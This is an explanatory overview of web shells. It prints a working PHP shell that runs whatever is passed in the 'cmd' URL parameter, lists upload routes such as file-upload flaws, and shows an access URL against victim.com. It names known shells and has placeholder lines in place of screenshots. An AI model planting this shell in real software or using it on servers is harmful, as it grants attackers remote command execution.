# Web Shell Overview

A web shell is a malicious script written in a language supported by a compromised web server, allowing attackers to execute commands and manipulate files through the web server itself. Web shells can be discreetly hidden within vulnerable web applications or services, making them challenging to detect. They are particularly popular among attackers due to their versatility and ease of use.

Web shells can be developed in various languages, including PHP, ASP, JSP, and CGI scripts.

## Example of a PHP Web Shell

Here's a simple example of a PHP web shell:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

In this example, the script checks if the `cmd` parameter is set in the URL query string. If it is, it executes the command using the `system()` function.

## Deployment

This script can be saved as `shell.php` and uploaded to a compromised web server through various means, such as:

- Unrestricted File Upload
- File Inclusion
- Command Injection
- Unauthorized Access

## Accessing the Web Shell

Once deployed, the web shell can be accessed via the following URL:

```bash
http://victim.com/uploads/shell.php?cmd=whoami
```

This request would execute the `whoami` command on the server, returning the result in the web browser.

## Popular Web Shells Available Online

Several web shells have gained popularity due to their functionalities and stealth capabilities. Here are some notable examples:

### p0wny-shell

A minimalistic, single-file PHP web shell that provides remote command execution capabilities.

*(Imagine a screenshot showing commands being executed in a GUI resembling a terminal.)*

### b374k shell

A feature-rich PHP web shell with capabilities for file management and command execution.

*(Imagine a screenshot showcasing the file manager feature for manipulating files.)*

### c99 shell

A well-known and robust PHP web shell with extensive functionalities for attackers.

*(Imagine a screenshot displaying both command execution and file manipulation features.)*

## Additional Resources

More web shells can be found online, with various functionalities to suit different malicious needs. For further exploration, you can visit: [R57 Shell](#).